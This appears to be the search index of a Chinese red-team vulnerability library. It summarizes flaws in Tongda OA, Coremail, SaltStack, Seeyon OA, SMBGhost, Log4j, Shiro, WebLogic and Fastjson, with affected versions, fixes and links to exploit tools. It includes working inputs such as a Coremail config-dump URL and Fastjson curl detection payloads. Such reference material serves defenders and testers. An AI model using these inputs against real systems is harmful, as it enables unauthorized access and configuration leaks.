\u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php \u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55 \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4 Coremail\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d SaltStack\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3 \u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html \u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f \u00b6 CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"\u6f0f\u6d1e\u5e93"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#_1","text":"l redis\u672a\u6388\u6743\u8bbf\u95ee l memcache\u672a\u6388\u6743\u8bbf\u95ee l docker\u672a\u6388\u6743\u8bbf\u95ee l k8s\u672a\u6388\u6743\u8bbf\u95ee , \u7206\u7834","title":"\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#log4j","text":"Apache Log4j2 \u662f\u4e00\u4e2a\u57fa\u4e8e Java \u7684\u65e5\u5fd7\u8bb0\u5f55\u5de5\u5177\u3002\u8be5\u5de5\u5177\u91cd\u5199\u4e86 Log4j \u6846\u67b6\uff0c\u5e76\u4e14\u5f15\u5165\u4e86\u5927\u91cf\u4e30\u5bcc\u7684\u7279\u6027\u3002\u8be5\u65e5\u5fd7\u6846\u67b6\u88ab\u5927\u91cf\u7528\u4e8e\u4e1a\u52a1\u7cfb\u7edf\u5f00\u53d1\uff0c\u7528\u6765\u8bb0\u5f55\u65e5\u5fd7\u4fe1\u606f\u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u5bfc\u81f4\u7684\u9519\u8bef\u4fe1\u606f\u5199\u5165\u65e5\u5fd7\u4e2d\u3002\u653b\u51fb\u8005\u5229\u7528\u6b64\u7279\u6027\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u6784\u9020\u7279\u6b8a\u7684\u6570\u636e\u8bf7\u6c42\u5305\uff0c\u6700\u7ec8\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u8be5\u6f0f\u6d1e\u5371\u5bb3\u7b49\u7ea7\uff1a\u4e25\u91cd \u5f71\u54cd\u8303\u56f4\uff1a2.0 <= Apache log4j2 <= 2.14.1 # 1 . \u65e5\u5fd7\u7684\u7531\u6765 ( 1 ) \u5386\u53f2 : system . out . println \u5173\u952e\u6570\u636e\u653e\u5728\u63a7\u5236\u53f0\u8c03\u8bd5 , \u8fc7\u591a\u7684\u8f93\u5165\u7e41\u7410 ( 2 ) \u73b0\u5728 : \u5199\u5728\u4e00\u4e2a\u6587\u4ef6xx . log , \u5229\u4e8e\u6392\u67e5\u95ee\u9898 , \u6240\u4ee5\u65e5\u5fd7\u6846\u67b6\u8bde\u751f\u4e86 # 2 . \u65e5\u5fd7\u53ef\u4ee5\u5206\u4e3a\u63a5\u53e3\u548c\u5b9e\u73b0\u7c7b ( 1 ) \u63a5\u53e3\u7c7b\u4f3cJDBC-mysql\u9a71\u52a8 , \u5c31\u662f\u4e00\u4e2a\u62bd\u8c61\u5c42 ( 2 ) \u5e73\u65f6\u7ed9\u9879\u76ee\u4e2d\u5bfc\u5165\u5177\u4f53\u7684\u65e5\u5fd7\u5c31\u884c\u4e86 # 3 . \u5e38\u89c1\u7684\u65e5\u5fd7\u7c7b\u578b \u65e5\u5fd7\u6846\u67b6 JCL \uff08 Jakarta Commons Logging \uff09 SLF4j \uff08 Simple Logging Facade for Java \uff09 jboss-logging \u65e5\u5fd7\u5b9e\u73b0 Log4j -- > \u5347\u7ea7 Logback JUL \uff08 java . util . logging\u5b98\u65b9 \uff09 Log4j2 ( \u592a\u8fc7\u65b0 , \u8bb8\u591a\u672a\u9002\u914d ) # 4 . \u6846\u67b6\u81ea\u5e26\u7684\u65e5\u5fd7 Spring\u6846\u67b6\u9ed8\u8ba4\u662f\u7528JCL , SpringBoot\u9009\u7528SLF4j\u548clogback slf4j\u4f1a\u4e0e\u5176\u4ed6\u6846\u67b6Spring \uff08 commons-logging \uff09 Hibernate \uff08 jboss-logging \uff09 # 5 . \u5982\u679c\u6211\u4eec\u9700\u8981\u7528slf4j + log4j2\u4e5f\u6709\u529e\u6cd5 , \u53ea\u8981\u52a0\u4e00\u4e2a\u9002\u914d\u5c42\u5373\u53ef #3.\u6f0f\u6d1e\u7b80\u5355\u4ecb\u7ecd \u9012\u5f52 : Apache Log4j2 \u67d0\u4e9b\u529f\u80fd\u5b58\u5728\u9012\u5f52\u89e3\u6790\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u65e0\u9700\u7279\u6b8a\u914d\u7f6e\u3002 \u53d7\u5f71\u54cd\u8303\u56f4 :Apache Log4j 2 . x < 2 . 15 . 0 - rc2 #4.\u4fee\u590d\u5efa\u8bae ( 1 ) \u7248\u672c\u5347\u7ea7 : \u8bf7\u5c3d\u5feb\u5347\u7ea7 Apache Log4j2\u6240\u6709\u76f8\u5173\u5e94\u7528\u5230\u6700\u65b0\u7684 log4j - 2 . 15 . 0 - rc2 \u7248\u672c\uff0c\u5730\u5740 https : // github . com / apache / logging - log4j2 / releases / tag / log4j - 2 . 15 . 0 - rc2 ( 2 ) \u53d7\u5f71\u54cd\u7684\u5e94\u7528\u53ca\u7ec4\u4ef6 : spring - boot - starter - log4j2 / Apache Struts2 / Apache Solr / Apache Druid / Apache Flink ( 3 ) \u5347\u7ea7 JDK ( \u4e34\u65f6\u65b9\u6848 ) :jdk\u7248\u672c\u81f36u211 / 7 u201 / 8 u191 / 11 . 0 . 1 \u4ee5\u4e0a\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9650\u5236 JNDI\u7b49\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f ( 4 ) \u4fee\u6539\u914d\u7f6e\u53c2\u6570 : \u5927\u4e8e 2 . 10 \u7248\u672c\u7684 Log4j -- \u53ef\u8bbe\u7f6e log4j2 . formatMsgNoLookups \u4e3a True -- \u6216\u8005\u5c06 JndiLookup \u7c7b\u4ece classpath \u4e2d\u53bb\u9664\uff0c\u4f8b\u5982 zip - q - d log4j - core -*. jar org / apache / logging / log4j / core / lookup / JndiLookup . class","title":"log4j\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#apache-shiro","text":"Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe \u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f.","title":"Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic","text":"","title":"weblogic\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#weblogic-t3","text":"\u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e , \u6216\u8005\u9650\u5236\u53ef\u8bbf\u95eeT3\u7aef\u53e3\u7684IP\u6765\u6e90 Weblogic XMLDecoder\u53cd\u5e8f\u5217\u5316 \u6f0f\u6d1e\u7b80\u4ecb WebLogic \u4e2d \u9ed8 \u8ba4 \u5305 \u542b \u7684 wls-wast \u4e0e wls9_async_response war \u5305 \uff0c \u7531 \u4e8e \u4ee5 \u4e0a WAR \u5305 \u91c7 \u7528 XMLDecoder \u53cd \u5e8f \u5217 \u5316 \u673a \u5236 \u6765 \u5904 \u7406 \u53d1 \u9001 \u8fc7 \u6765 \u7684 XML \u6570 \u636e \uff0c \u8fdc \u7a0b \u6076 \u610f \u653b \u51fb \u8005 \u53ef \u4ee5 \u901a \u8fc7 \u53d1 \u9001 \u7cbe \u5fc3 \u6784 \u9020 \u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff0c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\u3002\u4e5f\u5c31 \u662f\u8bf4\uff0c\u653b\u51fb\u8005\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u8fdb\u884c\u6570\u636e\u7a83\u53d6\uff0c\u8fdb\u800c\u751a\u81f3 \u4f1a\u5a01\u80c1\u53d7\u5bb3\u8005\u7684\u5185\u7f51\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 /wls-wsat/CoordinatorPortType /async/AsyncResponseService /async/AsyncResponseServiceSoap12 \u6f0f\u6d1e\u590d\u73b0 WebLogic XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-10271\uff09 https://blog.csdn.net/u013622866/article/details/104872747 WebLogic-XMLDecoder\u53cd\u5e8f\u5217\u5316\u5206\u6790 https://hu3sky.github.io/2019/10/16/weblogic/ \u5229\u7528\u5de5\u5177 weblogicScanner https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u901a\u8fc7\u8bbf\u95ee\u7b56\u7565\u63a7\u5236\u7981\u6b62\u5916\u90e8/_async/* \u53ca /wls-wsat/*\u8def\u5f84\u7684URL\u8bbf\u95ee \u5220\u9664\u5bf9\u5e94war\u5305\u5e76\u91cd\u542f webLogic \u9650\u5236\u6e90IP\u5bf9\u5e94 weblogic 7001\u7aef\u53e3\u7684\u8bbf\u95ee","title":"Weblogic T3 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson","text":"","title":"Fastjson\u53cd\u5e8f\u5217\u5316"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#fastjson-1222-1224","text":"\u6f0f\u6d1e\u7b80\u4ecb FastJson\u662falibaba\u7684\u4e00\u6b3e\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u53ef\u7528\u4e8e\u5c06Java\u5bf9\u8c61\u8f6c\u6362 \u4e3a\u5176JSON\u8868\u793a\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u7b49\u6548\u7684Java\u5bf9 \u8c61\u3002fastjson\u5728\u89e3\u6790json\u7684\u8fc7\u7a0b\u4e2d\uff0c\u652f\u6301\u4f7f\u7528autoType\u6765\u5b9e\u4f8b\u5316\u67d0\u4e00\u4e2a \u5177 \u4f53 \u7684 \u7c7b \uff0c \u5e76 \u8c03 \u7528 \u8be5 \u7c7b \u7684 set/get \u65b9 \u6cd5 \u6765 \u8bbf \u95ee \u5c5e \u6027 \u3002 \u5728 Java 8u102\u73af\u5883\u4e0b\uff0c\u6ca1\u6709com.sun.jndi.rmi.object.trustURLCodebase\u7684\u9650 \u5236\uff0c\u53ef\u4ee5\u4f7f\u7528com.sun.rowset.JdbcRowSetImpl\u7684\u5229\u7528\u94fe\uff0c\u501f\u52a9JNDI \u6ce8\u5165\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5f71\u54cd\u8303\u56f4 Fastjson 1.2.22 - 1.2.24 \u6f0f\u6d1e\u7279\u5f81 \u5982\u679c\u7ad9\u70b9\u6709\u539f\u59cb\u62a5\u9519\u56de\u663e\uff0c\u53ef\u4ee5\u7528\u4e0d\u95ed\u5408\u82b1\u62ec\u53f7\u7684\u65b9\u5f0f\u8fdb\u884c\u62a5\u9519\u56de\u663e\uff0c \u62a5 \u9519 \u4e2d \u5f80 \u5f80 \u4f1a \u6709 fastjson \u7684 \u5b57 \u6837 .(vulhub \u73af \u5883 \u4e0d \u9002 \u7528 \uff09 \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"success\", \"age\":20' \u53ef \u4ee5 \u901a \u8fc7 DNS \u56de \u663e \u7684 \u65b9 \u5f0f \u68c0 \u6d4b \u540e \u7aef \u662f \u5426 \u4f7f \u7528 Fastjson \u3002 curl http://10.154.7.128:8090/ -H \"Content-Type: application/json\" --data '{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0' Java \u7cfb Json \u5904\u7406\u57fa\u672c\u53ea\u6709 Fastjson \u548c Jackson\uff0c\u8ffd\u52a0\u4e00\u4e2a\u968f\u673a key\u65f6jackson\u4f1a\u62a5\u9519\u3002 \u5bf9 \u4f7f \u7528 fastjson \u7684 \u3002 Fastjson < 1.2.60 \u5728 \u53d6 \u4e0d \u5230 \u503c \u7684 